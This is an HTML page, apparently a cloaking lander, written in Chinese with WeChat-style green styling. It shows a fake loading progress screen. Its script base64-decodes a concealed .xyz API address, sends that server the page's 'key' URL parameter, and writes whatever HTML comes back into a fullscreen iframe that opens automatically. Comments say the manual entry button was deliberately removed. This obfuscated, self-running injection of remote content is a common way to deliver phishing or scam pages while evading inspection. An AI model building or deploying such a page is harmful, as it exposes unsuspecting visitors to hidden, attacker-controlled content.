<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = { theme: { extend: { colors: { primary: '#1AAD19' } } } }
  </script>
  <style>
    /* 与原文件完全一致，未改动 */
    body{margin:0;background:#F7F8FA;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
    #loadingBox{position:fixed;inset:0;display:flex;justify-content:center;align-items:center;background:#F7F8FA;z-index:9999}
    .card{background:#fff;width:90%;max-width:400px;padding:2.5rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.08);text-align:center}
    .spinner-container,.checkmark-container{height:80px;display:flex;align-items:center;justify-content:center;margin-bottom:1.5rem}
    .spinner{width:70px;height:70px;border:6px solid #f0f0f0;border-top:6px solid #1AAD19;border-radius:50%;animation:spin 1s linear infinite}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .progress-container{height:8px;background:#f0f0f0;border-radius:4px;overflow:hidden;margin-bottom:2rem}
    #progressBar{height:100%;background:linear-gradient(90deg,#1AAD19,#16C2C2);width:0;transition:width .3s}
    #message{color:#666;font-size:1.1rem;margin-bottom:1.5rem;line-height:1.5}
    /* 与按钮相关的样式已删除 */
    #fullscreenIframe{position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:10;opacity:0;visibility:hidden;transition:opacity .5s,visibility .5s}
    #fullscreenIframe.visible{opacity:1;visibility:visible}
    #loadingBox.hidden{opacity:0;transform:scale(.95);pointer-events:none}
    .checkmark-container{display:none}
    .checkmark-container.visible{display:flex}
    .checkmark-svg{width:100px;height:100px;animation:pop .5s ease}
    .checkmark-path{stroke:#1AAD19;stroke-width:4;stroke-linecap:round;stroke-linejoin:round;fill:none}
    @keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.1)}100%{transform:scale(1)}}
  </style>
</head>

<body>
  <div id="loadingBox">
    <div class="card">
      <div class="spinner-container" id="spinnerContainer">
        <div class="spinner"></div>
      </div>
      <div class="checkmark-container" id="checkmarkContainer">
        <svg class="checkmark-svg" viewBox="0 0 52 52">
          <path class="checkmark-path" d="M14 27l7 7 16-16"/>
        </svg>
      </div>
      <div id="message">准备加载内容...</div>
      <div class="progress-container">
        <div id="progressBar"></div>
      </div>
      <!-- 立即进入按钮已被移除 -->
    </div>
  </div>

  <iframe id="fullscreenIframe"></iframe>

  <script>
    const apiUrl = "aHR0cHM6Ly9jODguMTQ0Mjg4Lnh5ei9pbmRleF9hcGkucGhw";
    function getQueryString(name) {
      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
      const r = window.location.search.substr(1).match(reg);
      return r ? decodeURIComponent(r[2]) : null;
    }

    let currentProgress = 0;
    let isContentLoaded = false;
    let progressInterval;

    function init() {
      /* 0→90% 匀速 2 秒 */
      const TOTAL_DURATION = 2000, STEPS = 90, TICK = TOTAL_DURATION / STEPS;
      progressInterval = setInterval(() => {
        if (!isContentLoaded) {
          currentProgress++;
          document.getElementById('progressBar').style.width = `${currentProgress}%`;
          document.getElementById('message').textContent = `加载中... ${currentProgress}%`;
          if (currentProgress >= 90) clearInterval(progressInterval);
        }
      }, TICK);

      /* 隐藏 iframe 预加载 */
      const iframe = document.createElement('iframe');
      iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden;';
      document.body.appendChild(iframe);

      /* 预加载完成回调 */
      iframe.onload = () => {
        isContentLoaded = true;
        currentProgress = 100;
        document.getElementById('progressBar').style.width = '100%';
        document.getElementById('message').textContent = '准备就绪';

        /* 把内容搬到主 iframe */
        const mainFrame = document.getElementById('fullscreenIframe');
        mainFrame.contentDocument.open();
        mainFrame.contentDocument.write(iframe.contentDocument.documentElement.outerHTML);
        mainFrame.contentDocument.close();
        document.body.removeChild(iframe);

        /* 动画完成后自动进入（0.8 秒） */
        document.getElementById('spinnerContainer').style.display = 'none';
        document.getElementById('checkmarkContainer').classList.add('visible');

        setTimeout(() => {
          document.getElementById('loadingBox').classList.add('hidden');
          document.getElementById('fullscreenIframe').classList.add('visible');
        }, 800);
      };

      /* 向后端 POST 请求数据 */
      const url = getQueryString("key");
      const decodedApiUrl = atob(apiUrl);
      fetch(decodedApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `url=${encodeURIComponent(url)}`
      })
        .then(res => res.json())
        .then(data => {
          iframe.contentDocument.open();
          iframe.contentDocument.write(data.html);
          iframe.contentDocument.close();
        })
        .catch(err => {
          console.error(err);
          document.getElementById('message').textContent = '加载失败，请刷新重试';
        });
    }

    window.addEventListener('DOMContentLoaded', init);
  </script>
</body>
</html>
